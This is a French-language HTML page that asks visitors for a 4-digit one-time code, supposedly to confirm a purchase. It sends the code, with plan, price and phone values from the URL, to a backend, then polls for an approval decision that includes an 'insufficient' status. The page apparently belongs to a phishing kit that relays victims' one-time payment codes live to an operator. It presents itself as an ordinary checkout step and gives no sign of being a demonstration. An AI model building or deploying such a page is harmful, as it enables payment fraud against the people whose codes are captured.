<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Vérification OTP</title>
  <style>
    :root { --bg:#f4f6f8; --card:#fff; --text:#1c2733; --muted:#7a8794; --accent:#229ed9; --border:#e3e8ed; --ok:#1a9b57; --bad:#d64545; }
    * { box-sizing:border-box; }
    body { margin:0; min-height:100vh; display:grid; place-items:center; padding:24px; font-family:system-ui,-apple-system,'Segoe UI',Roboto,sans-serif; background:var(--bg); color:var(--text); }
    .card { width:100%; max-width:420px; background:var(--card); border:1px solid var(--border); border-radius:16px; padding:28px 24px; text-align:center; }
    h2 { margin:0 0 8px; }
    p { color:var(--muted); margin:0 0 18px; line-height:1.5; }
    input { width:100%; padding:12px; border:1px solid var(--border); border-radius:10px; background:transparent; color:var(--text); font:inherit; margin-bottom:12px; text-align:center; letter-spacing:0.3em; font-size:20px; }
    button { width:100%; padding:12px; border:0; border-radius:10px; background:var(--accent); color:#fff; font:inherit; font-weight:600; cursor:pointer; }
    .hidden { display:none; }
    .bad { color:var(--bad); }
    .ok { color:var(--ok); }
    .spinner { width:42px; height:42px; margin:0 auto 18px; border:4px solid var(--border); border-top-color:var(--accent); border-radius:50%; animation:spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="card">
    <div id="pending" class="hidden">
      <div class="spinner"></div>
      <h2>Vérification en cours</h2>
      <p>Votre demande est en attente d'approbation.</p>
    </div>

    <div id="otpForm">
      <h2>Code OTP</h2>
      <p>Entrez le code reçu pour confirmer votre achat.</p>
      <input id="otpInput" type="text" maxlength="4" inputmode="numeric" autocomplete="one-time-code" placeholder="0000">
      <button id="verifyBtn">Valider</button>
      <p id="error" class="bad" style="margin-top:12px"></p>
    </div>

    <div id="approved" class="hidden">
      <h2 class="ok">✅ Confirmé</h2>
      <p>Votre demande a été validée.</p>
    </div>
  </div>

  <script>
    const params = new URLSearchParams(window.location.search);
    const plan = params.get('plan') || '—';
    const price = params.get('price') || '—';
    const phone = params.get('phone') || '';
    const otpInput = document.getElementById('otpInput');
    const verifyBtn = document.getElementById('verifyBtn');
    const errorEl = document.getElementById('error');
    const otpForm = document.getElementById('otpForm');
    const pending = document.getElementById('pending');
    const approved = document.getElementById('approved');

    otpInput.addEventListener('input', () => {
      otpInput.value = otpInput.value.replace(/[^0-9]/g, '').slice(0, 4);
    });

    verifyBtn.addEventListener('click', async () => {
      const otp = otpInput.value.trim();
      if (!/^\d{4}$/.test(otp)) {
        errorEl.textContent = 'Entrez un code OTP à 4 chiffres.';
        return;
      }

      otpForm.classList.add('hidden');
      pending.classList.remove('hidden');
      errorEl.textContent = '';

      try {
        const res = await fetch('/api/request-approval', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            plan,
            price,
            phone,
            otp,
            step: 'otp'
          })
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error || 'Request failed');

        let attempts = 0;
        const poll = setInterval(async () => {
          attempts += 1;
          if (attempts > 30) {
            clearInterval(poll);
            pending.classList.add('hidden');
            otpForm.classList.remove('hidden');
            errorEl.textContent = 'La vérification a pris trop de temps. Réessayez.';
            return;
          }

          try {
            const statusRes = await fetch('/api/check-approval/' + data.id);
            const statusData = await statusRes.json();
            if (statusData.status === 'approved') {
              clearInterval(poll);
              pending.classList.add('hidden');
              approved.classList.remove('hidden');
              setTimeout(() => {
                window.location.href = 'mwish.html?' + params.toString();
              }, 800);
            } else if (statusData.status === 'denied' || statusData.status === 'insufficient' || statusData.status === 'demo_error') {
              clearInterval(poll);
              pending.classList.add('hidden');
              otpForm.classList.remove('hidden');
              errorEl.textContent = 'Code invalide ou demande refusée.';
            }
          } catch (err) {}
        }, 2000);
      } catch (err) {
        pending.classList.add('hidden');
        otpForm.classList.remove('hidden');
        errorEl.textContent = err.message || 'Impossible d’envoyer la demande.';
      }
    });
  </script>
</body>
</html>
